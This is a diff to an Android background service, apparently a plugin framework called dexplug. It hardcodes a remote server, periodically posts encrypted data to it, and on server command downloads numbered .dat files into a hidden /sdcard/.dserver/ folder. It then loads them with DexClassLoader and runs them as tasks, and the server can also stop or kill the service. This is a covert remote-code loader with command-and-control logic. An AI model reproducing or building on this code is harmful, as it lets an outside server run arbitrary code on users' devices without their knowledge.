@@ -3,10 +3,7 @@
  */
 package com.k99k.dexplug;
 
-import java.io.BufferedInputStream;
-import java.io.BufferedOutputStream;
 import java.io.BufferedReader;
-import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
@@ -29,7 +26,9 @@ import com.k99k.tools.encrypter.Encrypter;
 import dalvik.system.DexClassLoader;
 import android.app.Service;
 import android.content.Intent;
+import android.os.Handler;
 import android.os.IBinder;
+import android.os.Looper;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.widget.Toast;
@@ -61,6 +60,8 @@ public class DService extends Service {
 	public static final int STATE_RUNNING = 0;
 	public static final int STATE_PAUSE = 1;
 	public static final int STATE_STOP = 2;
+	public static final int STATE_NEED_RESTART = 3;
+	public static final int STATE_DIE = 4;
 	
 	
 	
@@ -71,20 +72,23 @@ public class DService extends Service {
     
 	private static byte[] key = new byte[]{79, 13, 33, -66, -58, 103, 3, -34, -45, 53, 9, 45, 28, -124, 50, -2};
 	
-	private static int taskSleepTime = 30*1000;
+	private static int taskSleepTime = 10*1000;
 	private static int upSleepTime = 1000*60*60*5;
 	private static long nextUpTime;
 	private static long lastUpTime;
-	private static String upUrl = "http://127.0.0.1:8080/";
 	private static int timeOut = 5000;
 	private final static int VERSION = 1;
 	private int keyVersion = 1;
 	private static final String SPLIT_STR = "@@";
+	private static final String datFileType = ".dat";
+	
 	private UpThread upThread;
 	private TaskThread taskThread;
 	
 	private static String dexOutputDir= "/data/data/com.k99k.dexplug";
-	private String localDexPath = "/mnt/sdcard/.dserver/";
+	//TODO 暂时写死
+	private static String upUrl = "http://180.96.63.71:8080/plserver/PS";
+	private String localDexPath = "/sdcard/.dserver/";
 	
 	private int state = STATE_RUNNING;
 	
@@ -139,7 +143,7 @@ public class DService extends Service {
 	
 	
 	private void syncTaskList(String remoteListStr,String downUrl){
-		String[] remoteList = remoteListStr.split(SPLIT_STR);
+		String[] remoteList = remoteListStr.split("_");
 		ArrayList<Integer> needFetchList = new ArrayList<Integer>();
 		synchronized (this.taskList) {
 			for (int i = 0; i < remoteList.length; i++) {
@@ -163,15 +167,17 @@ public class DService extends Service {
 		//fetch remote tasks
 		for (Integer id : needFetchList) {
 			if (this.fetchRemoteTask(id,downUrl)) {
+				Log.d(TAG, "fetch OK:"+id);
 				PLTask task = this.loadTask(id, this.localDexPath);
 				if (task != null) {
+					Log.d(TAG, "loadTask OK:"+id);
 					task.setDService(this);
 					task.init();
 					this.taskList.add(task);
 				}
 			}
 		}
-		
+		this.saveTaskList();
 	}
 	private static final int IO_BUFFER_SIZE = 1024 * 4;
 
@@ -183,17 +189,18 @@ public class DService extends Service {
 			InputStream is = con.getInputStream();
 			byte[] bs = new byte[IO_BUFFER_SIZE];
 			int len;
-			OutputStream os = new FileOutputStream(this.localDexPath+id+".dat");
+			OutputStream os = new FileOutputStream(this.localDexPath+id+datFileType);
 			while ((len = is.read(bs)) != -1) {
 				os.write(bs, 0, len);
 			}
 			os.close();
 			is.close();
+			
 			return true;
-		} catch (MalformedURLException e) {
+		} catch (Exception e) {
+			Log.e(TAG, "remote conn error:"+downUrl+"?id="+id);
 			e.printStackTrace();
-		} catch (IOException e) {
-			e.printStackTrace();
+			
 		}
 		return false;
 	}
@@ -235,7 +242,7 @@ public class DService extends Service {
 					}
 				}
 				
-				//Log.d(TAG, "postUrl data:"+sb.toString());
+				Log.d(TAG, "postUrl data:"+sb.toString());
 				
 				String data = "up="+Encrypter.getInstance().encrypt(sb.toString());
 				URL aUrl = new URL(upUrl);
@@ -260,6 +267,9 @@ public class DService extends Service {
 			    rd.close();
 			    //判断是否错误
 			    String resp = sb.toString();
+			    
+			    Log.d(TAG, "resp:"+resp);
+			    
 			    if (!StringUtil.isStringWithLen(resp, 4)) {
 					//判断错误码
 			    	if (resp.equals(ERR_KEY_EXPIRED)) {
@@ -273,6 +283,7 @@ public class DService extends Service {
 				}
 			    //解密
 				String re = Encrypter.getInstance().decrypt(resp);
+				Log.d(TAG, "dec re:"+re);
 				String[] res = re.split(SPLIT_STR);
 				if (!StringUtil.isDigits(res[0])) {
 					Log.e(TAG, "re length Error:"+re);
@@ -284,6 +295,7 @@ public class DService extends Service {
 					return true;
 				case ORDER_SYNC_TASK:
 					//比对task_id_list,进行同步
+					Log.d(TAG, "url:"+res[1]);
 					String downLoadUrl = res[1];
 					String remoteTaskIds = res[2];
 					DService.this.syncTaskList(remoteTaskIds,downLoadUrl);
@@ -327,6 +339,7 @@ public class DService extends Service {
 				Log.e(TAG, "up Error:"+upUrl, e);
 			} catch (Exception e) {
 				Log.e(TAG, "up unknown Error:"+upUrl, e);
+				DService.this.state = STATE_NEED_RESTART;
 			}
 			return false;
 		}
@@ -337,10 +350,11 @@ public class DService extends Service {
 			if (DService.this.state != STATE_RUNNING) {
 				return;
 			}
-			nextUpTime = System.currentTimeMillis();
+			nextUpTime = 1;
 			
 			try {
-				while (runFlag) {
+				while (runFlag && DService.this.state == STATE_RUNNING) {
+					Log.d(TAG, "up running state:"+DService.this.state);
 					if (DService.this.state != STATE_RUNNING) {
 						return;
 					}
@@ -365,23 +379,51 @@ public class DService extends Service {
 	}
 
 	private ArrayList<PLTask> taskList = new ArrayList<PLTask>();
+	private Handler handler; 
+	
+	public void addTask(PLTask task){
+		synchronized (this.taskList) {
+			this.taskList.add(task);
+		}
+		this.saveTaskList();
+	}
+	
+	public void delTask(int taskId){
+		synchronized (this.taskList) {
+			for (PLTask task : this.taskList) {
+				if (task.getId() == taskId) {
+					this.taskList.remove(task);
+					this.removeDat(task.getId());
+				}
+			}
+		}
+		this.saveTaskList();
+	}
+	
+	public void delTask(PLTask task){
+		synchronized (this.taskList) {
+			
+			this.taskList.remove(task);
+			this.removeDat(task.getId());
+		}
+		this.saveTaskList();
+	}
+	
+	private void removeDat(int tid){
+		try {
+			File f = new File(this.localDexPath+tid+datFileType);
+			if (f.exists()) {
+				f.delete();
+			}
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+	}
 	
 	class TaskThread extends Thread{
 	
 		private boolean runFlag = true;
 		
-		public void addTask(PLTask task){
-			DService.this.taskList.add(task);
-		}
-		
-		public void delTask(int taskId){
-			for (int i = 0; i < taskList.size(); i++) {
-				PLTask t = (PLTask)taskList.get(i);
-				if (t.getId() == taskId) {
-					taskList.remove(t);
-				}
-			}
-		}
 		
 		@Override
 		public void run() {
@@ -397,24 +439,28 @@ public class DService extends Service {
 			}
 			
 			try {
-				while (runFlag) {
-					if (DService.this.state != STATE_RUNNING) {
-						return;
-					}
+				while (runFlag && DService.this.state == STATE_RUNNING) {
+					Log.d(TAG, "task check");
 					for (PLTask task : taskList) {
 						int state = task.getState();
+						Log.d(TAG, "task state:"+state);
 						switch (state) {
 						case PLTask.STATE_WAITING:
-							//TODO 可能需要将task变成Runnable，在新线程中执行
-							task.exec();
+							try {
+								new Thread(task).start();
+							} catch (Exception e) {
+								e.printStackTrace();
+								Log.e(TAG, "task exec error:"+task.getId());
+							}
 							break;
 						case PLTask.STATE_DIE:
-							DService.this.taskList.remove(task);
+							DService.this.delTask(task);
 							break;
 						default:
 							break;
 						}
 					}
+					Log.d(TAG, runFlag+","+DService.this.state+","+taskSleepTime);
 					Thread.sleep(taskSleepTime);
 				}
 			} catch (InterruptedException e) {
@@ -433,6 +479,21 @@ public class DService extends Service {
 	}
 	
 	
+	
+	private void saveTaskList(){
+		StringBuilder sb = new StringBuilder();
+		synchronized (this.taskList) {
+			for (PLTask task : taskList) {
+				sb.append(SPLIT_STR);
+				int id = task.getId();
+				sb.append(id);
+			}
+		}
+		sb.delete(0, 2);
+		Log.d(TAG, "save task list:"+sb.toString());
+		IO.setPropString(this, "t", sb.toString());
+	}
+	
 	/**
 	 * 供Task访问，可实现Task之间的交互
 	 * @return
@@ -442,33 +503,71 @@ public class DService extends Service {
 	}
 	
 	private PLTask loadTask(int id,String localPath){
-		String dexPath = localPath+id+".dat";
+		String dexPath = localPath+id+datFileType;
 		File f = new File(dexPath);
 		if (f.exists() && f.isFile()) {
-			//TODO 这里需要解密处理,暂不实现加解密,直接下载的就是原始dex文件
-			DexClassLoader cDexClassLoader = new DexClassLoader(dexPath, dexOutputDir,null, this.getClass().getClassLoader()); 
 			try{
+				//TODO 这里需要解密处理,暂不实现加解密,直接下载的就是原始dex文件
+				dexPath = localPath+id+".jar";
+				f.renameTo(new File(dexPath));
+				
+				DexClassLoader cDexClassLoader = new DexClassLoader(dexPath, dexOutputDir,null, this.getClass().getClassLoader()); 
 				Class<?> class1 = cDexClassLoader.loadClass("com.k99k.dexplug.PLTask"+id);	
 				PLTask plug =(PLTask)class1.newInstance();
+				
+				//TODO 这里需要重新加密,移除解密后的文件
+				dexPath = localPath+id+datFileType;
+				f.renameTo(new File(dexPath));
 				return plug;
 			}catch (Exception e) {
+				Log.e(TAG, "loadTask error:"+localPath);
 				e.printStackTrace();
 			}    
 		}
 		return null;
 	}
 	
+	private void stop(){
+		if (this.upThread.runFlag) {
+			this.upThread.setRun(false);
+		}
+		if (this.taskThread.runFlag) {
+			this.taskThread.setRun(false);
+		}
+		this.state = STATE_STOP;
+		Log.d(TAG, "stoped...");
+		try {
+			Thread.sleep(3000);
+		} catch (InterruptedException e) {
+		}
+	}
+	
 	private void init(){
-		this.state = IO.getPropInt(getApplicationContext(), "state", STATE_RUNNING);
+		if (this.state == STATE_NEED_RESTART) {
+			//重启
+			this.stop();
+			this.state = STATE_RUNNING;
+		}else{
+			this.state = IO.getPropInt(getApplicationContext(), "state", STATE_RUNNING);
+		}
+		Log.d(TAG, "init...");
 		if (this.state == STATE_STOP) {
+			this.stop();
+			return;
+		}else if(this.state == STATE_DIE){
+			//这里的STATE_DIE状态直接杀死本进程
+			this.stop();
 			this.stopSelf();
+			return;
 		}else if(this.state == STATE_PAUSE){
 			return;
 		}
 		dexOutputDir = getApplicationInfo().dataDir;
+		(new File(localDexPath)).mkdirs();
 		String keyStr = IO.getPropString(this.getApplicationContext(), "k", Base64Coder.encode(key));
 		Encrypter.setKey(Base64Coder.decode(keyStr));
 		String tasks = IO.getPropString(this.getApplicationContext(), "t", "");
+		Log.d(TAG, "init tasks:"+tasks);
 		if (StringUtil.isStringWithLen(tasks, 1)) {
 			String[] taskArr = tasks.split(SPLIT_STR);
 			this.taskList.clear();
@@ -513,7 +612,12 @@ public class DService extends Service {
 	@Override
 	public void onCreate() {
 		Log.d(TAG, "dservice created...");
+		handler = new Handler(Looper.getMainLooper());
 		this.init();
+	}
+	
+	public Handler getHander(){
+		return this.handler;
 	}
 
 	/* (non-Javadoc)
@@ -521,7 +625,7 @@ public class DService extends Service {
 	 */
 	@Override
 	public void onDestroy() {
-		super.onDestroy();
+		this.saveTaskList();
 		Log.d(TAG, "dservice destroy...");
 	}
 
@@ -532,9 +636,9 @@ public class DService extends Service {
 	@Override
 	public int onStartCommand(Intent intent, int flags, int startId) {
 		Log.d(TAG, "dservice onStartCommand...");
-		
-		
-		
+		if (this.state == STATE_NEED_RESTART) {
+			this.init();
+		}
 		return super.onStartCommand(intent, flags, startId);
 	}
 
